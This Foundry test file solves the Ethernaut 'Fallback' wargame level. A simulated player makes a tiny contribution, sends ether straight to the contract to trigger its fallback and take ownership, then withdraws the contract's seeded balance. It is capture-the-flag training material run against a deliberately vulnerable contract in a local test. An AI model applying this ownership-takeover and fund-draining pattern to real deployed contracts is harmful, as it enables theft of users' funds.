// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {Statistics} from "src/metrics/Statistics.sol";
import {FallbackFactory} from "src/levels/FallbackFactory.sol";

// import {Fallback} from "src/levels/Fallback.sol";

interface IFallback {
    function contribute() external payable;

    function withdraw() external;
}

contract FallbackTest is Test {
    Ethernaut public ethernaut;
    FallbackFactory public fallbackFactory;
    address public immutable PLAYER = makeAddr("PLAYER");

    function setUp() public {
        Statistics statistics;

        // Deploy ethernaut contract
        ethernaut = new Ethernaut();
        statistics = new Statistics();
        statistics.initialize(address(ethernaut));
        ethernaut.setStatistics(address(statistics));

        // Register Fallback level
        fallbackFactory = new FallbackFactory();
        ethernaut.registerLevel(fallbackFactory);
    }

    function test_Fallback() public {
        IFallback target;

        vm.startPrank(PLAYER);
        vm.recordLogs();

        // Create Fallback level instance
        ethernaut.createLevelInstance(fallbackFactory);
        Vm.Log[] memory entries = vm.getRecordedLogs();
        target = IFallback(
            payable(address(uint160(uint256(entries[0].topics[2]))))
        );
        vm.deal(address(target), 1000 ether);

        // Initiate attack
        vm.deal(PLAYER, 1 ether);
        target.contribute{value: 1}();
        (bool success, ) = payable(address(target)).call{value: 1}("");
        require(success, "tx failed");
        target.withdraw();

        // Validate
        ethernaut.submitLevelInstance(payable(address(target)));
    }
}
